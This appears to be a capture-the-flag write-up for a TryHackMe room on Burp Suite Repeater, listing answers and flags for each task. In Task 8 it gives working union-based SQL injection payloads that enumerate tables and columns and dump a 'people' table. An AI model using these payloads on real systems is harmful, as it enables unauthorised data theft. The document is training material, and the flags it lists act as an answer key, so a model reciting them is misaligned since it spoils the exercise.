# Burp Suite: Repeater

{% embed url="https://tryhackme.com/room/burpsuiterepeater" %}
https://tryhackme.com/room/burpsuiterepeater
{% endembed %}

## Repeater

### Task 4 Views

#### Which view option displays the response in the same format as your browser would?

{% hint style="success" %}
`Render`
{% endhint %}

## Practical

### Task 6 Example

#### Send the request. What is the flag you receive?

![](<../../.gitbook/assets/Screenshot from 2022-04-05 17-16-07.png>)

{% hint style="success" %}
`THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}`
{% endhint %}

### Task 7 Challenge

#### See if you can get the server to error out with a "500 Internal Server Error" code by changing the number at the end of the request to extreme inputs.

#### What is the flag you receive when you cause a 500 error in the endpoint?

![](<../../.gitbook/assets/Screenshot from 2022-04-05 17-19-31.png>)

{% hint style="success" %}
`THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}`
{% endhint %}

## Extra Mile&#x20;

### Task 8 SQLi with Repeater

#### Exploit the union SQL injection vulnerability in the site.

```bash
UNION SELECT group_concat(table_name), 2, 3, 4, 5 \
FROM information_schema.tables WHERE table_schema=database();-- -
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 17-33-00.png>)

```bash
UNION SELECT group_concat(column_name), 2, 3, 4, 5 \
FROM information_schema.columns \
WHERE table_schema=database() AND table_name='people';-- -
```

![](<../../.gitbook/assets/Screenshot from 2022-04-05 17-31-05.png>)

```bash
UNION SELECT group_concat(notes), 2, 3, 4, 5 FROM people;-- -
```

#### What is the flag?

![](<../../.gitbook/assets/Screenshot from 2022-04-05 17-32-34.png>)

{% hint style="success" %}
`THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}`
{% endhint %}
